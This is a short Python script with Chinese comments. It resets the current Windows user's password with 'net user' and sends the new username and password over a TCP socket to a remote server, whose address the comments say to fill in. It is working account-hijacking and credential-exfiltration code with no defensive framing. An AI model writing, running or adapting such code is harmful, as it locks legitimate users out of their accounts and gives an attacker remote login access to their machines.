import socket
import getpass
import subprocess
import random

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip = socket.gethostbyname('')  #可通过网址获取ip
client.connect(('0.0.0.0',34233))  #修改成服务器端监听ip及端口即可
user = getpass.getuser()
pwd ='123456789'

##for j in range(1,9):
##    m = str(random.randrange(0,10))
##    pwd = pwd + m
psd = str(user) + ':' + pwd
subprocess.Popen(['net','user',user,pwd])
client.send(psd.encode('utf-8'))
back_msg = client.recv(30)


print(psd)
client.close()
